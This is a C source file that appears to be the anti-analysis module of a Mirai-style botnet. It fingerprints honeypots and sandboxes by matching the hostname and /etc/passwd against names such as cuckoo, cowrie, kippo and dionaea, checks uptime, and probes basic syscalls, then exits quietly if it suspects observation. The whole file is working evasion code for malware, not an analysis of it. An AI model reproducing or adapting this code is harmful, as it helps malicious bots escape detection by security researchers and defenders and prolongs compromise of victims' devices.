#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/wait.h>

#include "includes.h"
#include "antibot.h"
#include "util.h"
#include "rand.h"

#define HOSTNAME_PATH "/proc/sys/kernel/hostname"
#define PASSWD_PATH "/etc/passwd"
#define UPTIME_PATH "/proc/uptime"

static const char *honey_hostnames[] = {
    "admin@compute-node",
    "honey", "honeypot", "sandbox",
    "cuckoo", "malware-analysis",
    "analysis", "forensics",
    "cuckoosandbox", "detection",
    "infected", "sample",
    "vm-", "vbox-", "qemu-",
    "kvm-", "xen-", "docker-",
    NULL
};

static const char *honey_users[] = {
    "sandbox", "analysis", "cuckoo",
    "honey", "malware", "forensic",
    "sample", "detection",
    "snort", "clamav", "dionaea",
    "cowrie", "kippo", "glastopf",
    NULL
};

static void read_file_str(const char *path, char *buf, int max)
{
    int fd = open(path, O_RDONLY);
    if (fd != -1)
    {
        int n = read(fd, buf, max - 1);
        close(fd);
        if (n > 0)
            buf[n] = 0;
        else
            buf[0] = 0;
    }
    else
        buf[0] = 0;
}

static int get_uptime_seconds(void)
{
    char buf[64];
    read_file_str(UPTIME_PATH, buf, sizeof(buf));
    if (buf[0] == 0) return -1;
    return util_atoi(buf, 10);
}

static char hostname_matches(const char *name)
{
    int i;
    for (i = 0; honey_hostnames[i] != NULL; i++)
    {
        if (util_stristr((char *)name, -1, (char *)honey_hostnames[i]) != -1)
            return 1;
    }
    return 0;
}

static char passwd_matches(void)
{
    char buf[2048];
    int i;
    read_file_str(PASSWD_PATH, buf, sizeof(buf));
    if (buf[0] == 0) return 0;
    for (i = 0; honey_users[i] != NULL; i++)
    {
        if (util_stristr(buf, -1, (char *)honey_users[i]) != -1)
            return 1;
    }
    return 0;
}

static void check_system_sanity(void)
{
    int pipefd[2];
    char send = 'X', recv = 0;
    int fd;
    char tmpname[64] = "/tmp/.ck";
    char rdbuf[64];
    pid_t cpid;
    int wstat;

    if (write(-1, &send, 1) != -1)
        _exit(0);

    if (pipe(pipefd) != 0)
        _exit(0);
    if (write(pipefd[1], &send, 1) != 1 || read(pipefd[0], &recv, 1) != 1 || recv != 'X')
        _exit(0);
    close(pipefd[0]);
    close(pipefd[1]);

    fd = open("/dev/null", O_WRONLY);
    if (fd == -1)
        _exit(0);
    if (write(fd, &send, 1) != 1)
        _exit(0);
    close(fd);

    rand_alpha_str((uint8_t *)(tmpname + 7), 6);
    tmpname[13] = 0;
    fd = open(tmpname, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd == -1)
        _exit(0);
    if (write(fd, &send, 1) != 1)
        _exit(0);
    close(fd);
    fd = open(tmpname, O_RDONLY);
    if (fd == -1 || read(fd, rdbuf, 1) != 1 || rdbuf[0] != 'X')
        _exit(0);
    close(fd);
    unlink(tmpname);

    cpid = fork();
    if (cpid == -1)
        _exit(0);
    if (cpid == 0)
        _exit(42);
    if (waitpid(cpid, &wstat, 0) != cpid || !WIFEXITED(wstat) || WEXITSTATUS(wstat) != 42)
        _exit(0);

    if (readlink("/proc/self/exe", rdbuf, sizeof(rdbuf) - 1) <= 0 || rdbuf[0] != '/')
        _exit(0);
}

void antibot_init(void)
{
    char hostname[256];
    int uptime;

    check_system_sanity();

    read_file_str(HOSTNAME_PATH, hostname, sizeof(hostname));
    {
        char *nl = strchr(hostname, '\n');
        if (nl) *nl = 0;
    }

    if (hostname[0] != 0 && hostname_matches(hostname))
        _exit(0);

    if (passwd_matches())
        _exit(0);

    uptime = get_uptime_seconds();
    if (uptime < 300)
        _exit(0);
    if (uptime > 86400 * 60)
        _exit(0);
}
